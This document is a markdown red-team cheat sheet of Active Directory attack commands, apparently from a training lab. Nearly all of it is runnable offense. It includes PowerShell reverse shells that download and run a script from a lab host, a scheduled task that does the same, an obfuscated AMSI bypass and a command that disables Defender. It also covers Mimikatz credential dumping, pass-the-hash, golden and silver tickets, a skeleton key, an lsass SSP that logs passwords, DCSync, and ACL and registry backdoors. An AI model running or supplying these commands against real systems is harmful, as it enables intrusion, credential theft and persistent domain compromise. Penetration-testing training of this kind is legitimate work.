# Red-team-cheatsheet

# Summary
* [General](#General)
* [Domain Enumeration](#Domain-Enumeration)
    * [Powerview Domain](#Powerview-Domain)
    * [Powerview Users, groups and computers](#Powerview-users-groups-and-computers) 
    * [Powerview Shares](#Powerview-shares)
    * [Powerview GPO](#Powerview-GPO)
    * [Powerview ACL](#Powerview-ACL)
    * [Powerview Domain Trust](#Powerview-Domain-Trust)
    * [Misc](#misc) 
* [Local privilege escalation](#Local-privilege-escalation)
* [Lateral Movement](#Lateral-Movement)
   * [Mimikatz](#Mimikatz) 
* [Domain Persistence](#Domain-Persistence)
   * [Golden Ticket](#Golden-Ticket) 
   * [Silver Ticket](#Silver-Ticket)
   * [Skeleton Key](#Skeleton-Key)
   * [DSRM](#DSRM)
   * [Custom SSP - Track logons](#Custom-SSP---Track-logons)
   * [ACL](#ACL)
      * [AdminSDHolder](#AdminSDHolder)
      * [DCsync](#DCsync)
      * [SecurityDescriptor WMI](#SecurityDescriptor-WMI)
      * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
      * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
      

# General
```
ls \\computername\c$
```


# Domain Enumeration
## Powerview Domain
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
```
. C:\ad\tools\PowerView.ps1
```

#### Get current domain
```
Get-NetDomain
```

#### Get object of another domain
```
Get-NetDomain -Domain <domainname>
Get-NetDomain -Domain moneycorp.local
```

#### Get Domain SID for the current domain
```
Get-DomainSID
```

#### Get the domain policy
```
Get-DomainPolicy
```

## Powerview users groups and computers
#### Information of domain controller
```
Get-NetDomainController
```

#### Get information of users in the domain // list of users
```
Get-NetUser
Get-NetUser -Username student244
Get-NetUser | select samaccountname
```

#### Get list of all properties for users in the current domain
```
get-userproperty -Properties pwdlastset
```

#### Get descripton field from the user
```
Find-UserField -SearchField Description -SearchTerm "built"
```

#### Get computer information
```
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -FullData
Get-NetComputer -fulldata | select samaccountname,operatingsystem
```

#### List all groups of the domain
```
Get-NetGroup
Get-NetGroup -GroupName *admin*
Get-NetGroup -Domain moneycorp.local
```

#### Get all the members of the group
```
Get-NetGroupMember -Groupname "group" -Recurse
Get-NetGroupMember -Groupname "Domain Admins" -Recurse
```

#### Get the group membership of a user
```
Get-NetGroup -Username "student244"
```

#### List all the local groups on a machine (needs admin privs on non dc machines)
```
Get-NetlocalGroup -Computername dcorp-dc.dollarcorp.moneycorp.local -ListGroups
```

#### Get Member of all the local groups on a machine (needs admin privs on non dc machines)
```
Get-NetlocalGroup -Computername dcorp-dc.dollarcorp.moneycorp.local -Recurse
```

#### Get actively logged users on a computer (needs local admin privs)
```
Get-NetLoggedon -Computername <servername>
```

#### Get locally logged users on a computer (needs remote registary rights on the target)
```
Get-LoggedonLocal -Computername dcorp-dc.dollarcorp.moneycorp.local
```

#### Get the last logged users on a computer (needs admin rights and remote registary on the target)
```
Get-LastLoggedOn -ComputerName <servername>
```

## Powerview shares
#### Find shared on hosts in the current domain
```
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```

#### Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```

#### Get all fileservers of the domain
```
Get-NetFileServer
```

## Powerview GPO
#### Get list of GPO's in the current domain
```
Get-NetGPO
Get-NetGPO -Computername dcorp-std244.dollarcorp.moneycorp.local
```

#### Get GPO's which uses restricteds groups or groups.xml for interesting users
```
Get-NetGPOGroup
```

#### Get users which are in a local group of a machine using GPO
```
Find-GPOComputerAdmin -Computername dcorp-std244.dollarcorp.moneycorp.local
```

#### Get machines where the given user is member of a specific group
```
Find-GPOLocation -Username student244 -Verbose
```

#### Get OU's in a domain
```
Get-NetOU -Fulldata
```

#### Get machines t hat are part of an OU
```
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```

#### Get GPO applied on an OU
```
Get-NetGPO -GPOname "{Guid}"
```

## Powerview ACL
#### Get the ACL's associated with the specified object
```
Get-ObjectACL -SamAccountName student244 -ResolveGUIDS
```

#### Get the ACL's associated with the specified prefix to be used for search
```
Get-ObjectACL -ADSprefix ‘CN=Administrator,CN=Users’ -Verbose
```

#### Get the ACL's associated with the specified path
```
Get-PathAcl -Path \\dcorp-dc.dollarcorp.moneycorp.local\sysvol
```

#### Search for interesting ACL's
```
Invoke-ACLScanner -ResolveGUIDs
```

#### Search of interesting ACL's for the current user
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student244"}
```

## Powerview Domain trust
#### Get a list of all the domain trusts for the current domain
```
Get-NetDomainTrust
```

#### Get details about the current forest
```
Get-NetForest
```

#### Get all domains in the current forest
```
Get-NetForestDomain
Get-NetforestDomain -Forest eurocorp.local
```

#### Get global catalogs for the current forest
```
Get-NetForestCatalog
Get-NetForestCatalog -Forest eurocorp.local
```

#### Map trusts of a forest
```
Get-NetForestTrust
Get-NetForestTrust -Forest eurocorp.local
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```

## Misc
####  Powerview Find all machines on the current domain where the current user has local admin access
```
Find-LocalAdminAccess -Verbose

. ./Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```

####  Powerview Find local admins on all machines of the domain (needs admin privs)
```
Invoke-EnumerateLocalAdmin -Verbose

. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

#### Connect to machine with administrator privs
```
Enter-PSSession -Computername <computername>
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

####  Find computers where a domain admin has sessions
```
Invoke-UserHunter -Groupname "RDPUsers"
Invoke-UserHunter -CheckAccess
```

####  BloodHound
```
. ./sharphound.ps1
Invoke-Bloodhound -CollectionMethod all -Verbose
Invoke-Bloodhound -CollectionMethod LoggedOn -Verbose
Run neo4j.bat
#Install and start the service
Run BloodHound.exe
```

####  Powershell reverse shell
```
Powershell.exe iex (iwr http://172.16.100.244/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.244 -Port 443
```

# Local privilege escalation
Focussing on Service issues
#### Privesc check all
https://github.com/enjoiz/Privesc
```
. ./Invoke-PrivEsc
Invoke-PrivEsc
```

#### Beroot check all
https://github.com/AlessandroZ/BeRoot
```
./beRoot.exe
```

####  Run powerup check all
https://github.com/HarmJ0y/PowerUp
```
. ./powerup
Invoke-allchecks
```

####  Run powerup get services with unqouted paths and a space in their name
```
Get-ServiceUnqouted -Verbose
Get-ModifiableServiceFile -Verbose
```

####  Abuse service to get local admin permissions with powerup
```
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student244'
```

####  Jekins
```
Runs as local admin, go to /job/project/configure to try to see if you have build permissions in /job/project0/configure
Execute windows or shell comand into the build, you can also use powershell scripts
```

### Add user to local admin and RDP group and enable RDP on firewall
```
net user student244 SuWYn9WDHp86xk6M /add /Y   && net localgroup administrators student244 /add   && net localgroup "Remote Desktop Users" student244 /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

# Lateral Movement
#### Connect to machine with administrator privs
```
Enter-PSSession -Computername <computername>
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

#### Execute commands on a machine
```
Invoke-Command -Computername <computername> -Scriptblock {whoami} 
Invoke-Command -Scriptblock {whoami} $sess
```

#### Load script on a machine
```
Invoke-Command -Computername <computername> -FilePath "<path>"
Invoke-Command -FilePath "<path>" $sess
```

#### Download and load script on a machine
```
iex (iwr http://xxx.xxx.xxx.xxx/<scriptname> -UseBasicParsing)
```

#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

#### Disable AV monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Execute locally loaded function on the remote machines
```
Invoke-Command -Scriptblock ${function:Get-PassHashes} -Computername (Get-Content <list_of_servers>)
```

## Mimikatz
#### Mimikatz dump credentials on local machine
```
Invoke-Mimikatz -Dumpcreds
```

#### Mimikatz dump credentials on multiple remote machines
```
Invoke-Mimikatz -Dumpcreds -Computername @(“sys1”,”sys2”)
```

#### Mimikatz start powershell pass the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash> /run:powershell.exe"'
```

#### Check the language mode
```
$ExecutionContext.SessionState.LanguageMode
```

#### Enumerate applocker policy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Copy item to other server
```
Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

# Domain persistence
## Golden ticket
#### Dump hashes - Get the krbtgt hash
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

#### Make golden ticket
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

#use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
#sid = full sid of anything minus the last block
```

#### Use the DCSync feature for getting krbtgt hash execute with DA privileges
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## Silver ticket
#### Make silver ticket
```
#Use the hash of the local computer

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'

#Execute for WMI /service:HOST /service:RPCSS
```

#### Schedule and execute a task
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.244/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN “Reverse”
```

## Skeleton key
#### Create the skeleton key
```
#Leaves a big gap in their security!
Invoke-MimiKatz -Command ‘”privilege::debug” “misc::skeleton”’ -Computername dcorp-dc.dollarcorp.moneycorp.local

#access any machine with the password mimikatz
```

## DSRM
Directory Services Restore Mode
#### Dump DSRM password - dumps local users
```
#look for the local administrator password
Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername dcorp-dc
```

#### Change login behavior for the local admin on the DC
```
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD

#If already exists
Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
```

#### Pass the hash for local admin
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

## Custom SSP - Track logons
A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP packages by Microsoft are: NTLM, Kerberos, Wdigest, credSSP. Mimikatz provides a custom SSP – mimilib.dll . This SSP logs local logons, service account and machine account passwords in clear text on the target server.

#### Mimilib.dll
Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
SetItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' Value $packages
```

#### Use mimikatz to inject into lsass
```
Invoke-Mimikatz -Command ‘”misc:memssp”’

#all logons are logged to C:\Windows\System32\kiwissp.log
```

## ACL
### AdminSDHolder
#### Check if student has replication rights
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "student244") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

#### Add fullcontrol permissions for a user to the adminSDHolder
```
Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName student244 -Rights All -Verbose
```

#### Run SDProp op AD
```
Invoke-SDPropagator -showProgress -timeoutMinutes 1

#Before server 2008
Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

#### Check domain admin privileges as normal user
```
Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘student244’}
```

#### Add user to domain admin group
```
Add-DomainGroupMember -Identity ‘Domain Admins’ -Members student244 -Verbose
```

#### Abuse resetpassword using powerview_dev
```
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString “Password@123” -AsPlainText -Force ) Verbose
```

### DCsync
#### Add full-control rights
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName student244 -Rights All -Verbose
```

#### Add rights for DCsync
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName student244 -Rights DCSync -Verbose
```

#### Execute DCSync
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### SecurityDescriptor WMI
```
. ./Set-RemoteWMI.ps1
```
#### On a local machine
```
Set-RemoteWMI -Username student244 -Verbose
```

#### On a remote machine without explicit credentials
```
Set-RemoteWMI -Username student244 -Computername dcorp-dc.dollarcorp.moneycorp.local -namespace ‘root\cimv2’ -Verbose
```

#### On a remote machine with explicit credentials
Only root/cimv and nested namespaces
```
Set-RemoteWMI -Username student244 -Computername dcorp-dc.dollarcorp.moneycorp.local -Credential Administrator -namespace ‘root\cimv2’ -Verbose
```

#### On remote machine remove permissions
```
Set-RemoteWMI -Username student244 -Computername dcorp-dc-namespace ‘root\cimv2’ -Remove -Verbose
```

#### Check WMI permissions
```
Get-wmiobject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### SecurityDescriptor - Powershell Remoting
```
. ./Set-RemotePSRemoting.ps1
```

#### On a local machine
```
Set-RemotePSRemoting -Username student244 -Verbose
```

#### On a remote machine without credentials
```
Set-RemotePSRemoting -Username student244 -Computername dcorp-dc -Verbose
```

#### On a remote machine remove permissions
```
Set-RemotePSRemoting -Username student244 -Computername dcorp-dc -Remove
```

### SecurityDescriptor - Remote Registry
Using the DAMP toolkit
```
. ./Add-RemoteRegBackdoor
. ./RemoteHashRetrieval
```

#### Using DAMP with admin privs on remote machine
```
Add-RemoteRegBackdoor -Computername dcorp-dc -Trustee student244 -Verbose
```

#### Retrieve machine account hash from local machine
```
Get-RemoteMachineAccountHash -Computername dcorp-dc -Verbose
```

#### Retrieve local account hash from local machine
```
Get-RemoteLocalAccountHash -Computername dcorp-dc -Verbose
```

#### Retrieve domain cached credentials from local machine
```
Get-RemoteCachedCredential -Computername dcorp-dc -Verbose
```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```
